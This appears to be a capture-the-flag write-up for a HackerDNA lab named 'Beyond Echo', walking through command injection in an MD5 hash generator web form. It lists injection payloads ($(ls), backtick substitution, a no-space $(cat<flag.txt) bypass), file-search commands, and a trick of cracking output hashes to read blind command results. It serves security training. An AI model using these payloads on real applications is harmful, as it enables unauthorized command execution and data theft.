![Medium](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat)
![Beyond Echo](https://img.shields.io/badge/Beyond%20Echo-Command%20Substitution-blueviolet?style=flat&logo=gnu-bash&logoColor=white)



# Beyond Echo

**Platform:** HackerDNA  
**Difficulty:** Medium  

## Objective  
Use the MD5 Hash Generator to test how the application handles input, confirm command execution through hash changes, and retrieve the flag from the server.

## Steps  
1. Start the machine in HackerDNA.  
2. Open the provided lab URL.  
3. The page displays an MD5 Hash Generator — this is the only attack surface.  
4. Enter test input and observe the hash:  
   - `d41d8cd98f00b204e9800998ecf8427e` = empty output  
   - Any different hash = command output was hashed  
5. Test command substitution:  
   - `$(ls)`  
   - `` `ls` ``  
   - `$(cat<flag.txt)` (no‑space bypass)  
6. When the hash changes, decode it on CrackStation to view the command output.  
7. Locate the flag:  
   - `find / -name flag.txt 2>/dev/null`  
8. Read the flag:  
   - `cat /flag.txt`  
9. Submit the flag to complete the lab.

## Flag  
Retrieved from `/flag.txt` after confirming command execution.

